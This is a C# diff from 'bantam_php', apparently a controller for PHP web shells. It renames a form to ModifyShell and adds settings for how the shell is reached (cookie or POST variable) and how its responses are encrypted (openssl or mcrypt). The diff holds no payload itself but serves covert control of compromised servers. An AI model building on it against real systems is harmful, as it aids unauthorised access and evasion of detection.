@@ -1,19 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace bantam_php
 {
-    public partial class AddHost : Form
+    public partial class ModifyShell : Form
     {
-        public static AddHost instance = null;
+        public static ModifyShell instance = null;
        
         /// <summary>
         /// 
@@ -23,19 +16,37 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public Dictionary<string, int> requestTypes = new Dictionary<string, int>() {
-            { "cookie", 0 },
-            { "post", 1 },
+        public List<string> requestTypes = new List<string>() {
+            "cookie",
+            "post",
+        };
+
+
+        /// <summary>
+        /// 
+        /// </summary>
+        public static readonly List<string> responseEncryptionModes = new List<string>() {
+             "openssl",
+             "mcrypt",
         };
 
         /// <summary>
         /// 
         /// </summary>
-        public AddHost()
+        public ModifyShell()
         {
             InitializeComponent();
 
+            foreach(var item in requestTypes) {
+                comboBoxVarType.Items.Add(item);
+            }
+
+            foreach(var item in responseEncryptionModes) {
+                comboBoxEncryptionMode.Items.Add(item);
+            }
+
             comboBoxVarType.SelectedIndex = 0;
+            comboBoxEncryptionMode.SelectedIndex = 0;
         }
 
         /// <summary>
@@ -44,25 +55,34 @@ namespace bantam_php
         /// <param name="shellUrl"></param>
         /// <param name="varName"></param>
         /// <param name="varType"></param>
-        public AddHost(string shellUrl = "", string varName = "", string varType = "")
+        public ModifyShell(string shellUrl = "", string varName = "", string varType = "")
         {
             InitializeComponent();
 
             Text = "Update Shell";
 
-            txtBoxShellUrl.Text = shellUrl;
-            txtBoxArgName.Text = varName;
-            g_CallingShellUrl = shellUrl;
-
-            if (BantamMain.Shells.ContainsKey(shellUrl)) {
-                checkBoxResponseEncryption.Checked = BantamMain.Shells[shellUrl].encryptResponse;
+            foreach (var item in requestTypes) {
+                comboBoxVarType.Items.Add(item);
             }
 
-            if (requestTypes.ContainsKey(varType)) {
-                comboBoxVarType.SelectedIndex = requestTypes[varType];
+            foreach (var item in responseEncryptionModes) {
+                comboBoxEncryptionMode.Items.Add(item);
+            }
+
+            g_CallingShellUrl = txtBoxShellUrl.Text = shellUrl;
+            txtBoxArgName.Text = varName;
+
+            if (BantamMain.Shells.ContainsKey(shellUrl)) {
+                checkBoxResponseEncryption.Checked = BantamMain.Shells[shellUrl].responseEncryption;
+            }
+
+            if (requestTypes.Contains(varType)) {
+                comboBoxVarType.SelectedIndex = requestTypes.IndexOf(varType);
             } else {
                 comboBoxVarType.SelectedIndex = 0;
             }
+
+            comboBoxEncryptionMode.SelectedIndex = BantamMain.Shells[shellUrl].responseEncryptionMode;
 
             btnAddShell.Visible = false;
             btnUpdateShell.Visible = true;
@@ -94,10 +114,10 @@ namespace bantam_php
             }
 
             if (checkBoxResponseEncryption.Checked == false) {
-                BantamMain.Shells[shellURL].encryptResponse = false;
+                BantamMain.Shells[shellURL].responseEncryption = false;
+            } else {
+                BantamMain.Shells[shellURL].responseEncryptionMode = comboBoxEncryptionMode.SelectedIndex;
             }
-
-            //MessageBox.Show("1");
 
             Program.g_BantamMain.InitializeShellData(shellURL);
             Program.g_BantamMain.addClientForm.Hide();
@@ -144,9 +164,11 @@ namespace bantam_php
             }
 
             if (checkBoxResponseEncryption.Checked == false) {
-                BantamMain.Shells[shellURL].encryptResponse = false;
-                BantamMain.Shells[shellURL].encryptResponse = false;
+                BantamMain.Shells[shellURL].responseEncryption = false;
+            } else {
+                BantamMain.Shells[shellURL].responseEncryptionMode = comboBoxEncryptionMode.SelectedIndex;
             }
+
             Program.g_BantamMain.InitializeShellData(shellURL);
             Program.g_BantamMain.updateHostForm.Hide();
         }
